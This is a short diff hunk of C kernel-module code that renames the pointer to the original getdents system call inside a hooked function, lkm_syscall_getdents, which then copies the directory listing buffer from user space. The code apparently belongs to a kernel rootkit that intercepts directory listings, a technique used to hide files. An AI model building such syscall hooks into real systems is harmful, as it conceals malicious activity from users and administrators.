@@ -52,7 +52,7 @@ static int lkm_syscall_getdents(unsigned int fd,
     struct linux_dirent *loc_dirp, *dir;
     char *offset_buffer;
 
-    ret = ((getdents)original_syscall)(fd, dirp, count);
+    ret = ((getdents)original_syscall_getdents)(fd, dirp, count);
 
     if (copy_from_user(buffer, dirp, 32768) != 0)
     {
